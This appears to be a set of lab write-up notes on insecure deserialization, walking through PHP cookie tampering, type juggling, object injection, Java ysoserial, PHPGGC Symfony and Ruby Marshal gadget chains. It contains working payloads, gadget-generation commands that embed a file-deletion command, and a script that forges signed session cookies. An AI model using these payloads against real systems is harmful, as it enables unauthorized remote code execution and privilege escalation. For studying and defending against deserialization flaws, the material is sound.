# Insecure Deserialization

**Category:** Insecure Deserialization  
**Severity:** High or Critical

---

## Definition

**Insecure Deserialization** occurs when an application takes serialized data from an untrusted source and deserializes it without properly validating or controlling what is being processed.

**Serialization** is the process of converting an object or data structure into a format that can be stored or transmitted. **Deserialization** is the reverse process, where that data is converted back into an object that the application can use.

The vulnerability appears when the application **trusts serialized data that can be modified by an attacker**.

In simple terms:

```text
Object
   |
   | Serialization
   v
Serialized Data
   |
   | Sent to / stored by application
   v
Attacker modifies the data
   |
   | Deserialization
   v
Application reconstructs the object


## Modifying Serialized Objects

* **The Objective:** Exploit insecure deserialization by modifying a serialized object stored in a session cookie. The goal is to change the user's privilege level from a normal user to an administrator and access administrative functionality.

* **The Mechanism:** The application stores session information inside a serialized PHP object. The object contains an `admin` attribute that determines whether the user has administrative privileges. Because the application trusts the serialized object received from the client without adequately validating its integrity, an attacker can modify the serialized data and change the value of the `admin` attribute.

* **Core Layout Structure:**

```text
Session Cookie
      |
      | URL/Base64 decoding
      v
Serialized PHP Object
      |
      | Modify object attribute
      v
admin = false
      |
      | Change to
      v
admin = true
      |
      v
Application Deserializes Object
      |
      v
Administrative Privileges
```

* **The Session Cookie:** The application stores the serialized session object inside a client-side cookie. The cookie may appear unreadable because it is URL-encoded and Base64-encoded.

* **The Decoded Object:** After decoding the cookie, the underlying serialized PHP object can be inspected. A simplified representation may look like:

```text
admin = false
```

In PHP serialization, a boolean value is represented using the `b` type:

```text
b:0
```

represents:

```text
false
```

while:

```text
b:1
```

represents:

```text
true
```

* **The Vulnerability:** The application trusts security-sensitive values contained within the serialized object. Since the object is stored on the client side and is not protected against modification, an attacker can alter the privilege-related attribute before sending the cookie back to the server.

* **Modifying the Serialized Object:** The attacker changes the serialized `admin` attribute from:

```text
b:0
```

to:

```text
b:1
```

Conceptually:

```text
Before:
admin = false

After:
admin = true
```

The modified object is then re-encoded and supplied as the session cookie.

* **The Deserialization Process:** When the server receives the modified cookie, it decodes and deserializes the object. If there is no integrity validation, the application accepts the modified `admin` value and treats the attacker as an administrator.

* **The Privilege Escalation:**

```text
Normal User
    |
    | Modified session object
    v
admin = true
    |
    v
Application deserializes object
    |
    v
Administrator privileges
    |
    v
/admin
```

* **The Administrative Functionality:** Once the modified session is accepted, administrative functionality becomes accessible. The administrative interface may expose privileged operations such as viewing users or deleting accounts.

* **Example Administrative Request:**

```http
GET /admin HTTP/1.1
Host: target.com
Cookie: session=MODIFIED_SESSION_COOKIE
```

* **Administrative Action:** An administrative endpoint may provide functionality such as deleting a user:

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: target.com
Cookie: session=MODIFIED_SESSION_COOKIE
```

* **Core Concept:** The important issue is not simply that the application uses serialization. The vulnerability occurs because **security-sensitive serialized data is controlled by the client and is trusted after deserialization without sufficient integrity protection or server-side validation**.

* **The Security Impact:** Insecure deserialization of modifiable session objects can lead to privilege escalation, authentication bypass, unauthorized administrative actions, account manipulation, and potentially more severe attacks depending on the capabilities of the serialized object and the deserialization process.
# Insecure Deserialization

## Modifying Serialized Data Types

* **The Objective:** Exploit insecure deserialization by modifying the data types inside a serialized session object. The goal is to bypass authentication and make the application treat the attacker as the `administrator` user.

* **The Mechanism:** The application stores authentication information inside a serialized PHP object. The object contains a `username` attribute and an `access_token` attribute. Because the serialized object is stored in a client-controlled session cookie and is not adequately protected, the attacker can modify both the values and their underlying data types.

* **Core Layout Structure:**

```text
Session Cookie
      |
      | Decode
      v
Serialized PHP Object
      |
      | Modify values and data types
      v
username = administrator
access_token = integer 0
      |
      v
Application Deserializes Object
      |
      | Weak type comparison
      v
Authentication Bypass
      |
      v
Administrator Account
```

* **The Serialized Object:** A simplified PHP serialized object may contain fields similar to:

```text
O:4:"User":2:{
    s:8:"username";s:6:"wiener";
    s:12:"access_token";s:32:"RANDOM-TOKEN";
}
```

The important fields are the `username` and `access_token` values.

* **The Vulnerability:** The application relies on serialized client-side data when determining the user's identity. If the application also performs weak comparisons between values of different data types, changing the serialized data type can cause an unexpected authentication result.

* **The Data Type Modification:** PHP serialization identifies the type of each value. For example:

```text
s
```

represents a string, while:

```text
i
```

represents an integer.

Therefore:

```text
s:32:"RANDOM-TOKEN";
```

represents a string, while:

```text
i:0;
```

represents the integer `0`.

* **The Authentication Bypass:** The attacker modifies the serialized object so that the username becomes `administrator` and the access token becomes the integer `0`.

```text
Before:

username = wiener
access_token = "RANDOM-TOKEN"

After:

username = administrator
access_token = 0
```

* **Modified Serialized Object:**

```text
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

The important changes are:

```text
s:6:"wiener"
        |
        v
s:13:"administrator"
```

and:

```text
s:32:"RANDOM-TOKEN"
        |
        v
i:0
```

* **The Type Confusion:** The application expects the access token to be a string but receives an integer instead. Under weak comparison behavior in PHP 7.x and earlier, comparisons between different data types can produce unexpected results. This can cause an attacker-controlled value such as `0` to satisfy an authentication check that should require a valid token.

* **The Deserialization Process:** The modified cookie is sent back to the server. The application decodes and deserializes the object, resulting in:

```text
username = administrator
access_token = 0
```

If the authentication check uses a weak comparison, the application may accept the modified object as a valid authenticated session.

* **The Privilege Escalation:**

```text
Normal User
    |
    | Modify serialized object
    v
username = administrator
access_token = integer 0
    |
    v
Weak type comparison
    |
    v
Authentication Bypass
    |
    v
Administrator Account
```

* **Example Modified Session Object:**

```http
GET /my-account HTTP/1.1
Host: target.com
Cookie: session=MODIFIED_SESSION_COOKIE
```

The modified session cookie contains the serialized object with the altered username and access-token type.

* **The Administrative Access:** Once the authentication check is bypassed, the application treats the attacker as the `administrator` user and exposes administrative functionality such as `/admin`.

```http
GET /admin HTTP/1.1
Host: target.com
Cookie: session=MODIFIED_SESSION_COOKIE
```

* **Administrative Action:** Administrative functionality may expose endpoints capable of modifying or deleting other users:

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: target.com
Cookie: session=MODIFIED_SESSION_COOKIE
```

* **Core Concept:** The important issue is that insecure deserialization can allow an attacker to manipulate not only the **values** stored in a serialized object, but also their **data types**. When this is combined with weak type comparisons, a value of an unexpected type can bypass authentication logic.

* **The Security Impact:** Modifying serialized data types can result in authentication bypass, privilege escalation, unauthorized account access, and administrative actions. Applications should avoid trusting client-controlled serialized objects and should use strict type comparisons and server-side validation for security-sensitive authentication data.

## Using Application Functionality to Exploit Insecure Deserialization

* **The Objective:** Exploit insecure deserialization by modifying a serialized object so that an existing application feature uses an attacker-controlled file path. The goal is to abuse the account deletion functionality to delete a file from another user's home directory.

* **The Mechanism:** The application stores session data inside a serialized object. One of the object's attributes, `avatar_link`, contains a file path associated with the user's avatar. A dangerous application method uses this value during account deletion. Because the serialized object can be modified by the client, the attacker can change `avatar_link` to point to an arbitrary file.

* **Core Layout Structure:**

```text
Session Cookie
      |
      | Decode serialized object
      v
avatar_link = /path/to/avatar
      |
      | Modify serialized value
      v
avatar_link = /home/carlos/morale.txt
      |
      v
Application Functionality
      |
      | Account deletion
      v
Dangerous File Operation
      |
      v
Target File Deleted
```

* **The Serialized Object:** The session cookie contains a serialized PHP object with attributes representing information associated with the user's account. One of these attributes may resemble:

```text
s:11:"avatar_link";s:23:"/path/to/avatar"
```

The `s:23` portion specifies the length of the string stored in the attribute.

* **The Vulnerability:** The application uses a client-controlled serialized attribute as an input to a sensitive file operation. The application does not adequately validate that the supplied file path belongs to the current user's permitted directory.

* **Modifying the File Path:** The attacker changes the `avatar_link` attribute so that it points to the target file:

```text
s:11:"avatar_link";s:23:"/home/carlos/morale.txt"
```

The string-length value must match the length of the new path.

* **The Dangerous Application Functionality:** The vulnerability becomes exploitable because the application already contains functionality that performs a file operation using `avatar_link`. In this case, deleting the user's account causes the application to process the avatar file associated with the serialized object.

* **The Attack Flow:**

```text
Attacker
   |
   | Modified session object
   v
avatar_link = /home/carlos/morale.txt
   |
   v
POST /my-account/delete
   |
   v
Application processes avatar_link
   |
   v
File operation on attacker-controlled path
   |
   v
/home/carlos/morale.txt deleted
```

* **Example Request:**

```http
POST /my-account/delete HTTP/1.1
Host: target.com
Cookie: session=MODIFIED_SESSION_COOKIE
Content-Type: application/x-www-form-urlencoded

```

The important part of the request is the modified serialized session object contained within the session cookie.

* **The Key Concept:** Insecure deserialization does not always require injecting a completely new object or directly invoking a dangerous function. An attacker may instead modify an existing object property and then trigger legitimate application functionality that already performs a dangerous operation using that property.

* **The Security Impact:** If serialized object properties are trusted without validation, attackers may manipulate file paths, URLs, commands, or other sensitive values consumed by application functionality. Depending on the available methods, this can lead to arbitrary file deletion, file access, path traversal, privilege escalation, or potentially remote code execution.

## Arbitrary Object Injection in PHP

* **The Objective:** Exploit PHP object deserialization to inject an attacker-controlled serialized object into a session cookie. The goal is to create an object whose magic method performs a dangerous file operation when the object is destroyed.

* **The Mechanism:** PHP allows objects to define magic methods such as `__destruct()`, which is automatically invoked when an object is destroyed. If an application deserializes attacker-controlled data and the corresponding class contains a dangerous magic method, an attacker may be able to create an instance of that class and control the properties used by the method.

* **Core Layout Structure:**

```text
Attacker-Controlled Serialized Object
              |
              v
        PHP unserialize()
              |
              v
      Object Instantiated
              |
              v
       __destruct() Called
              |
              v
   Dangerous Method Executed
              |
              v
      File Operation
```

* **The Source Code:** To perform arbitrary object injection, the attacker generally needs to identify a suitable class and understand how its methods use object properties. Source code may reveal classes that contain dangerous magic methods.

* **The Vulnerable Class:** A vulnerable application may contain a class similar to:

```php
class CustomTemplate
{
    private $lock_file_path;

    function __destruct()
    {
        unlink($this->lock_file_path);
    }
}
```

The important part is that `__destruct()` automatically calls `unlink()` using the value stored in `lock_file_path`.

* **The Dangerous Magic Method:** The `__destruct()` method is automatically executed when the object is destroyed. If an attacker can control the object's properties through deserialization, the method may perform an operation on an attacker-selected path.

* **The Object Injection:** The attacker creates a serialized instance of the vulnerable class and assigns a target file path to the dangerous property:

```text
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

The serialized structure represents:

```text
Class: CustomTemplate
Property: lock_file_path
Value: /home/carlos/morale.txt
```

* **The Serialization Structure:** PHP serialized objects contain type identifiers and length indicators. For example:

```text
O:14:"CustomTemplate"
```

represents an object whose class name is `CustomTemplate`.

The following section:

```text
s:14:"lock_file_path"
```

represents the property name, while:

```text
s:23:"/home/carlos/morale.txt"
```

represents the string value and its length.

* **The Malicious Object:**

```text
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

The attacker then encodes the serialized object in the format expected by the application, such as Base64 and URL encoding, before placing it into the session cookie.

* **The Session Cookie:** The application expects serialized session data inside a client-controlled cookie:

```http
Cookie: session=ENCODED_SERIALIZED_OBJECT
```

If the application passes this data to PHP's deserialization functionality without validating the object type or its contents, the attacker can replace the legitimate object with the malicious one.

* **The Deserialization Process:**

```text
Session Cookie
      |
      | Base64/URL decode
      v
Serialized CustomTemplate Object
      |
      | unserialize()
      v
CustomTemplate Instance
      |
      v
__destruct()
      |
      | unlink(lock_file_path)
      v
Target File
```

* **The File Operation:** When the malicious object is destroyed, the `__destruct()` method uses the attacker-controlled `lock_file_path` value. In the vulnerable scenario, this causes the application to execute a file deletion operation against the supplied path.

* **Core Concept:** Arbitrary object injection occurs when an attacker can control serialized PHP data and cause the application to instantiate an object of a class that was not intended to be created with attacker-controlled properties.

The attacker does not necessarily inject executable PHP code directly. Instead, they abuse an existing class and its methods to make the application perform a dangerous operation.

* **The Security Impact:** PHP arbitrary object injection can lead to arbitrary file deletion, file access, privilege escalation, command execution, or remote code execution when suitable gadget classes and dangerous magic methods are available in the application's codebase.

## Exploiting Java Deserialization with Apache Commons

* **The Objective:** Exploit Java deserialization by injecting a malicious serialized object that uses an available Apache Commons Collections gadget chain to trigger a command on the server.

* **The Mechanism:** The application stores session information in a serialized Java object. During deserialization, Java reconstructs objects contained in the serialized data. If the application's classpath contains vulnerable gadget classes, an attacker can use a pre-built gadget chain to cause unintended code execution when the object is deserialized.

* **Core Layout Structure:**

```text
Attacker-Controlled Serialized Object
              |
              v
       Java Deserialization
              |
              v
   Apache Commons Gadget Chain
              |
              v
      Method Invocation
              |
              v
     Command Execution
```

* **The Serialized Session:** The application stores a serialized Java object inside a session cookie:

```http
Cookie: session=ENCODED_SERIALIZED_OBJECT
```

The serialized object can be extracted and analyzed to determine that the application is using Java serialization.

* **The Gadget Chain:** A gadget chain is a sequence of existing classes and methods that can be linked together so that deserialization eventually reaches a dangerous operation. In this case, the application loads **Apache Commons Collections**, which provides classes that can be used as part of a known Java deserialization gadget chain.

* **The Vulnerability:** The application deserializes attacker-controlled Java objects without sufficiently restricting the classes that can be instantiated. Because the required gadget classes are available in the application's classpath, an attacker can construct a serialized object that triggers unintended behavior during deserialization.

* **Generating the Malicious Object:** A tool such as `ysoserial` can generate serialized objects containing pre-built gadget chains. A gadget such as `CommonsCollections4` can be selected to generate a payload containing a command.

```bash
java -jar ysoserial-all.jar CommonsCollections4 'COMMAND' | base64
```

The resulting output is a Base64-encoded serialized Java object.

* **Java 16+ Compatibility:** Modern Java versions may require additional module-opening arguments when running older gadget-generation tools:

```bash
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections4 'COMMAND' | base64
```

* **Example Payload:** In a controlled lab environment, the generated command can perform an intended file operation:

```bash
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

The important point is that the command is embedded inside the serialized gadget chain rather than being sent as ordinary application input.

* **The Payload Encoding:** The generated serialized object is Base64-encoded so that it can be transported through the session cookie. If the application expects URL-encoded cookie values, the generated payload must also be URL-encoded before being placed into the request.

* **The Deserialization Process:**

```text
Base64/URL-Encoded Cookie
          |
          v
    Decode Payload
          |
          v
 Java Object Deserialization
          |
          v
CommonsCollections4 Gadget Chain
          |
          v
   Dangerous Method Chain
          |
          v
      Command Execution
```

* **The Session Cookie:** The malicious serialized object replaces the legitimate session object:

```http
GET / HTTP/1.1
Host: target.com
Cookie: session=URL_ENCODED_MALICIOUS_OBJECT
```

When the application processes the request, it deserializes the supplied object.

* **The Gadget Execution:** During deserialization, the gadget chain causes a sequence of existing Java classes and methods to execute. Eventually, the command embedded in the generated object is reached.

* **Core Concept:** Java deserialization vulnerabilities become especially dangerous when attacker-controlled serialized data can instantiate classes from libraries already present in the application. Gadget chains allow an attacker to combine otherwise ordinary classes and methods into an unintended execution path.

```text
Untrusted Serialized Data
          |
          v
      Deserialization
          |
          v
   Available Gadget Classes
          |
          v
      Gadget Chain
          |
          v
    Arbitrary Command
          |
          v
 Remote Code Execution
```

* **The Security Impact:** Unsafe Java deserialization can result in arbitrary code execution, command execution, privilege escalation, authentication bypass, data theft, file manipulation, and complete server compromise. The risk is particularly significant when commonly used libraries expose classes that can be chained into exploitable gadget sequences.

## Exploiting PHP Deserialization with a Pre-Built Gadget Chain

* **The Objective**

  * Exploit insecure PHP deserialization when the application uses a signed, serialized session cookie.
  * Identify the PHP framework and obtain the secret key used to sign the cookie.
  * Generate a malicious serialized object using a pre-built gadget chain.
  * Create a valid signed cookie containing the malicious object.
  * Trigger remote code execution through the deserialization process.

* **The Mechanism**

  * The application stores session data inside a client-side cookie.
  * The cookie contains:

    * A Base64-encoded serialized PHP object.
    * An HMAC-SHA1 signature used to detect tampering.
  * Normally, modifying the serialized object invalidates the signature.
  * If the signing secret is exposed, an attacker can:

    1. Generate a malicious serialized object.
    2. Sign it with the leaked secret.
    3. Submit the forged cookie.
    4. Cause the server to deserialize and execute the gadget chain.

### Core Layout Structure

```text
Client
  |
  v
Signed Session Cookie
  |
  +-- token -> Base64 -> Serialized PHP Object
  |
  +-- sig_hmac_sha1 -> HMAC-SHA1(token, SECRET_KEY)
  |
  v
Web Application
  |
  +-- Verify Signature
  |
  +-- Base64 Decode
  |
  +-- PHP Deserialize
  |
  v
Symfony Gadget Chain
  |
  v
Remote Code Execution
```

* **The Session Cookie**

  * The cookie conceptually contains a structure similar to:

```text
{
  "token": "<BASE64-SERIALIZED-OBJECT>",
  "sig_hmac_sha1": "<HMAC-SHA1-SIGNATURE>"
}
```

* The `token` contains the serialized PHP object.

* The signature is calculated from the token and a server-side secret.

* **The Vulnerability**

  * PHP deserialization becomes dangerous when attacker-controlled serialized objects can reach `unserialize()`.
  * A signature can normally prevent object modification, but it does not make deserialization itself safe.
  * If the secret used to generate the signature is disclosed, the attacker can create a valid signature for a malicious object.

* **Framework Identification**

  * Error messages, debug files, exposed configuration, or other information leaks may reveal the framework and version.
  * In this technique, identifying the framework is important because pre-built gadget chains are generally framework/version dependent.

```text
Information Leak
      |
      v
Framework + Version
      |
      v
Select Compatible Gadget Chain
```

* **Secret Key Disclosure**

  * A debug or information page may expose environment variables or application configuration.
  * If the HMAC secret is exposed, it can be used to generate valid signatures for attacker-controlled serialized objects.

```text
SECRET_KEY
    |
    v
HMAC-SHA1(
    malicious_serialized_object,
    SECRET_KEY
)
    |
    v
Valid Signature
```

* **Pre-Built Gadget Chains**

  * PHPGGC (PHP Generic Gadget Chains) can generate serialized objects for known PHP gadget chains.
  * A gadget chain abuses existing classes and magic methods within installed frameworks or libraries.
  * The attacker does not necessarily need source-code access if the framework and compatible gadget chain are known.

* **Generating the Malicious Object**

  * For a Symfony RCE gadget chain, PHPGGC can be used to generate a serialized object containing the desired command:

```bash
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
```

* The output is a Base64-encoded serialized PHP object.

* The generated object becomes the `token` value in the forged session cookie.

* **Constructing the Signed Cookie**

  * The malicious object must be signed using the application's leaked secret key.
  * A PHP script can calculate the HMAC and construct the required cookie structure:

```php
<?php

$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";

$cookie = urlencode(
    '{"token":"' . $object .
    '","sig_hmac_sha1":"' .
    hash_hmac('sha1', $object, $secretKey) .
    '"}'
);

echo $cookie;
```

* **Forged Cookie Structure**

```text
Malicious Serialized Object
          |
          v
       Base64
          |
          v
       token
          |
          +----> HMAC-SHA1(token, SECRET_KEY)
                         |
                         v
                    sig_hmac_sha1
                         |
                         v
              URL-encoded Cookie
```

* **Deserialization and Gadget Execution**

  * The application receives the forged cookie.
  * The HMAC is calculated and compared against the supplied signature.
  * Because the attacker knows the secret key, the signature is valid.
  * The application decodes the token and deserializes the malicious object.
  * Symfony's available gadget classes form a chain that reaches the intended dangerous operation.
  * The supplied command is ultimately executed by the vulnerable application context.

* **Attack Flow**

```text
1. Obtain a valid session cookie
          |
          v
2. Decode the cookie
          |
          v
3. Identify PHP serialization
          |
          v
4. Identify framework/version
          |
          v
5. Obtain leaked SECRET_KEY
          |
          v
6. Generate compatible gadget chain
          |
          v
7. Base64-encode serialized object
          |
          v
8. Calculate HMAC-SHA1 signature
          |
          v
9. Build forged session cookie
          |
          v
10. Submit cookie
          |
          v
11. PHP deserializes object
          |
          v
12. Gadget chain reaches command execution
```

* **Core Concept**

  * The critical issue is the combination of:

    * Client-controlled serialized objects.
    * Unsafe PHP deserialization.
    * A framework containing usable gadget classes.
    * Exposure of the signing secret.
  * A signed cookie does not prevent exploitation if the attacker can obtain the secret required to produce a valid signature.

* **The Security Impact**

  * Successful exploitation can result in:

    * Remote code execution.
    * Arbitrary operating-system commands.
    * File deletion or modification.
    * Access to application secrets.
    * Further compromise of the application or underlying server.
  * Pre-built gadget chains make exploitation possible even when application source code is unavailable.

## Exploiting Ruby Deserialization Using a Documented Gadget Chain

* **The Objective**

  * Exploit insecure Ruby deserialization in a Ruby on Rails application.
  * Identify that the session cookie contains a serialized Ruby object using `Marshal`.
  * Use a publicly documented gadget chain to construct a malicious serialized object.
  * Trigger remote code execution through the deserialization process.

* **The Mechanism**

  * Ruby applications can serialize objects using the `Marshal` format.
  * If an application deserializes attacker-controlled data, an attacker may be able to supply objects that cause unintended behavior during deserialization.
  * Ruby on Rails and its dependencies may contain classes that can be chained together to reach dangerous functionality.
  * A documented gadget chain can be adapted to execute attacker-controlled commands.

### Core Layout Structure

```text
Client
  |
  v
Session Cookie
  |
  v
Base64-Encoded Ruby Marshal Object
  |
  v
Ruby on Rails Application
  |
  v
Marshal Deserialization
  |
  v
Gadget Chain
  |
  v
Command Execution
```

* **The Session Cookie**

  * The session cookie contains a serialized Ruby object.
  * Ruby's `Marshal` format is used to represent the object and its associated data.
  * The serialized object is typically encoded before being placed into the cookie.

```text
Session Cookie
      |
      v
Encoded Data
      |
      v
Ruby Marshal Object
      |
      v
Application Deserialization
```

* **The Vulnerability**

  * The application trusts serialized data supplied through the session mechanism.
  * When this data is passed to Ruby's deserialization functionality, an attacker-controlled object can be reconstructed.
  * If suitable gadget classes are available, the deserialization process can trigger a chain of method calls leading to command execution.

* **Documented Gadget Chain**

  * Unlike attacks that require discovering a gadget chain from application source code, documented Ruby deserialization exploits can provide an existing chain for known Ruby/Rails environments.
  * A published gadget chain can be adapted by changing the command and output format.
  * The exact gadget chain depends on the Ruby and framework versions and the classes available in the application's environment.

```text
Known Ruby/Rails Environment
          |
          v
Documented Gadget Chain
          |
          v
Adapt Payload
          |
          v
Serialized Marshal Object
```

* **Generating the Malicious Object**

  * A documented Ruby deserialization gadget chain can be used to generate the malicious object.
  * The command executed by the payload can be changed to the desired operation.

```ruby
# Gadget-chain generation logic
# Change the command to the intended lab command.

command = "rm /home/carlos/morale.txt"
```

* The final payload should be Base64-encoded so it can be placed into the session cookie:

```ruby
puts Base64.encode64(payload)
```

* **Payload Encoding**

  * The generated Ruby `Marshal` object is Base64-encoded before being inserted into the cookie.
  * The cookie may also require URL encoding because Base64 data can contain characters that have special meaning in URLs.

```text
Ruby Object
    |
    v
Marshal Serialization
    |
    v
Base64 Encoding
    |
    v
URL Encoding
    |
    v
Session Cookie
```

* **Deserialization Process**

  * The application receives the session cookie.
  * The encoded value is decoded.
  * Ruby reconstructs the serialized object using `Marshal`.
  * During this process, the gadget chain causes the vulnerable classes to interact in an unintended sequence.
  * The chain eventually reaches the command-execution primitive.

* **Attack Flow**

```text
1. Obtain a normal session cookie
          |
          v
2. Identify Ruby Marshal serialization
          |
          v
3. Identify the Ruby/Rails environment
          |
          v
4. Locate a documented compatible gadget chain
          |
          v
5. Adapt the gadget chain
          |
          v
6. Set the desired command
          |
          v
7. Generate the Marshal payload
          |
          v
8. Base64-encode the payload
          |
          v
9. URL-encode the cookie value
          |
          v
10. Submit the malicious session cookie
          |
          v
11. Application deserializes the object
          |
          v
12. Gadget chain reaches command execution
```

* **Core Concept**

  * Ruby deserialization becomes dangerous when untrusted serialized objects are accepted and reconstructed by the application.
  * A documented gadget chain can turn this unsafe deserialization primitive into remote code execution without requiring direct access to the application's source code.
  * The important relationship is:

```text
Untrusted Marshal Data
        +
Unsafe Deserialization
        +
Available Gadget Chain
        =
Potential Remote Code Execution
```

* **The Security Impact**

  * Successful exploitation can allow:

    * Remote code execution.
    * Arbitrary operating-system commands.
    * File creation, modification, or deletion.
    * Access to application data and secrets.
    * Further compromise of the application server.
  * The availability of a documented gadget chain significantly lowers the amount of application-specific research required to exploit an unsafe Ruby deserialization endpoint.
